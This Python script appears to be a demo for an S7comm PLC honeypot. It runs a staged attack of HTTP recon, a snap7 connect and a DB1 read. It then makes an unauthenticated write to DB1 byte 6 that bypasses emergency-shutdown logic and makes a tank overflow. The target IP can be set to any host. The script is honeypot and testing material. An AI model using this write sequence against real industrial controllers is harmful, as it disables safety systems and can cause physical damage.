#!/usr/bin/env python3
"""
full_attack_demo.py
===================
Full simulated attack against the s7pot S7comm Honeypot.
Mimics a real ICS attacker: recon  read  exploit  monitor.

Usage (honeypot must be running first):
  python3 full_attack_demo.py
  python3 full_attack_demo.py --ip 192.168.1.50   # remote target
"""
import sys
import snap7
import struct
import time
import urllib.request

TARGET_IP = sys.argv[sys.argv.index("--ip") + 1] if "--ip" in sys.argv else "127.0.0.1"

BANNER = """

        s7pot S7comm Honeypot — Full Attack Simulation        
        Target: {:<47} 

""".format(TARGET_IP)

print(BANNER)

#  PHASE 1: HTTP Recon 
print("" * 62)
print("[PHASE 1] HTTP Reconnaissance — probing Siemens web portal")
print("" * 62)
for path in ["/", "/Portal/Portal.mwsl"]:
    try:
        url = f"http://{TARGET_IP}{path}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        r   = urllib.request.urlopen(req, timeout=3)
        print(f"  GET {path}")
        print(f"    HTTP {r.status}")
        print(f"    Server : {r.headers.get('Server', 'N/A')}")
        body = r.read(512).decode(errors="ignore")
        if "leaked" in body:
            print(f"      Info leak detected in response body!")
    except Exception as e:
        print(f"  GET {path}    {e}")

time.sleep(1)

#  PHASE 2: S7comm Connect & Enumerate 
print()
print("" * 62)
print("[PHASE 2] S7comm — connecting to PLC on port 102")
print("" * 62)
plc = snap7.client.Client()
try:
    plc.connect(TARGET_IP, 0, 1)   # Rack 0, Slot 1
    print("Connected to PLC!")
    try:
        info = plc.get_cpu_info()
        print(f"  Module : {info.ModuleTypeName.decode().strip()}")
        print(f"  Serial : {info.SerialNumber.decode().strip()}")
        print(f"  AS Name: {info.ASName.decode().strip()}")
    except Exception:
        print("  (CPU info not available from this snap7 build)")
except Exception as e:
    print(f"   Connection error: {e}")
    sys.exit(1)

time.sleep(1)

#  PHASE 3: Read DB1 (Reconnaissance) 
print()
print("" * 62)
print("[PHASE 3] DB Read — enumerating live process state in DB1")
print("" * 62)
data        = plc.db_read(1, 0, 16)
pump_status = data[0]
water_level = struct.unpack_from('>f', data, 2)[0]
crash_flag  = data[6]
print(f"  Pump Status : {'ON' if pump_status else 'OFF'}")
print(f"  Water Level : {water_level:.1f} L")
print(f"  Safety Flag : {' ALREADY BYPASSED' if crash_flag else 'Active (ESD armed)'}")
print()
print("   Live process data confirmed — target is worth exploiting.")

time.sleep(1)

#  PHASE 4: Exploit 
print()
print("" * 62)
print("[PHASE 4] Exploit — CVE-2021-37185 — unauthenticated DB write")
print("" * 62)
print("  Writing 0x01 to DB1.Byte6 (crash/safety-bypass flag)...")
plc.db_write(1, 6, bytearray([1]))
print("Payload delivered! ESD safety logic bypassed.")
print("      Pump is now locked ON — tank will overflow.")

time.sleep(1)

#  PHASE 5: Post-Exploit Monitoring 
print()
print("" * 62)
print("[PHASE 5] Post-exploit monitoring (12 seconds)")
print("" * 62)
alarm_fired = False
for i in range(12):
    data  = plc.db_read(1, 0, 16)
    level = struct.unpack_from('>f', data, 2)[0]
    pump  = data[0]
    flag  = data[6]
    bar   = "" * int(level / 5) + "" * (30 - int(level / 5))
    bar   = bar[:30]
    label = "OVERFLOW" if level >= 150 else ("HIGH" if level >= 100 else "")
    if level >= 150 and not alarm_fired:
        alarm_fired = True
        print(f"\n  *** ESD TRIGGERED — Tank exceeded 150 L ***\n")
    print(f"  t+{i+1:02d}s | [{bar}] {level:6.1f}L | Pump:{'ON ' if pump else 'OFF'} {label}")
    time.sleep(1)

plc.disconnect()

#  Summary 
print()
print("" * 62)
print("  Attack simulation complete.")
print("  Check logs/interaction.json for captured telemetry.")
print("" * 62)
